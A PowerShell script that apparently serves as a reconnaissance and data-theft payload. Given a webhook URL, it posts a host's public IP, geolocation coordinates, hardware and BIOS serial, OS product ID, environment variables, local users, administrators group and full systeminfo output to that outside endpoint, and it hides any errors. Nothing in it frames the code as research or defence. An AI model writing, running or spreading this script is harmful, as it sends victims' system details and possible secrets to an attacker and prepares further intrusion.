param($webhookUrl)

function Send-Data {
    param($title, $data)
    $body = "===== $title =====`r`n$data`r`n`r`n"
    Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $body -ContentType "text/plain" -UseBasicParsing
}

try {
    # 1. Public IP
    $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
    Send-Data "PUBLIC IP" $publicIP

    # 2. Geolocation
    try {
        $geo = Invoke-WebRequest -Uri "https://ipapi.co/json/" -UseBasicParsing | ConvertFrom-Json
        $geoInfo = "Country: $($geo.country_name)`r`nCity: $($geo.city)`r`nRegion: $($geo.region)`r`nLatitude: $($geo.latitude)`r`nLongitude: $($geo.longitude)`r`nISP: $($geo.org)"
        Send-Data "GEOLOCATION" $geoInfo
    } catch {}

    # 3. Hardware Info
    $computerSystem = Get-WmiObject Win32_ComputerSystem
    $bios = Get-WmiObject Win32_BIOS
    $cpu = Get-WmiObject Win32_Processor
    $hardwareInfo = @"
Manufacturer: $($computerSystem.Manufacturer)
Model: $($computerSystem.Model)
Total RAM: $([math]::Round($computerSystem.TotalPhysicalMemory/1GB,2)) GB
CPU: $($cpu.Name)
Cores: $($cpu.NumberOfCores)
BIOS: $($bios.Manufacturer) $($bios.Name)
Serial Number: $($bios.SerialNumber)
"@
    Send-Data "HARDWARE INFO" $hardwareInfo

    # 4. Operating System
    $os = Get-WmiObject Win32_OperatingSystem
    $osInfo = @"
OS Name: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)
Install Date: $($os.InstallDate)
Last Boot: $($os.LastBootUpTime)
Product ID: $($os.SerialNumber)
Registered User: $($os.RegisteredUser)
"@
    Send-Data "OPERATING SYSTEM" $osInfo

    # 5. Disk Drives
    $disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }
    $diskInfo = @()
    foreach ($disk in $disks) {
        $diskInfo += "Drive $($disk.DeviceID) - Total: $([math]::Round($disk.Size/1GB,2)) GB, Free: $([math]::Round($disk.FreeSpace/1GB,2)) GB"
    }
    Send-Data "DISK DRIVES" ($diskInfo -join "`r`n")

    # 6. Firewall Status
    $fwDomain = Get-NetFirewallProfile -Name Domain | Select-Object -ExpandProperty Enabled
    $fwPrivate = Get-NetFirewallProfile -Name Private | Select-Object -ExpandProperty Enabled
    $fwPublic = Get-NetFirewallProfile -Name Public | Select-Object -ExpandProperty Enabled
    $firewallInfo = "Domain: $fwDomain`r`nPrivate: $fwPrivate`r`nPublic: $fwPublic"
    Send-Data "FIREWALL STATUS" $firewallInfo

    # 7. Environment Variables
    $envVars = Get-ChildItem Env: | Format-Table -AutoSize | Out-String
    Send-Data "ENVIRONMENT VARIABLES" $envVars

    # 8. Local Users
    $users = net user | Out-String
    Send-Data "LOCAL USERS" $users

    # 9. Administrators Group
    $admins = net localgroup Administrators | Out-String
    Send-Data "ADMINISTRATORS GROUP" $admins

    # 10. System Info
    $systemInfo = systeminfo | Out-String
    Send-Data "SYSTEMINFO" $systemInfo

} catch {
    Send-Data "ERROR" $_.Exception.Message
}
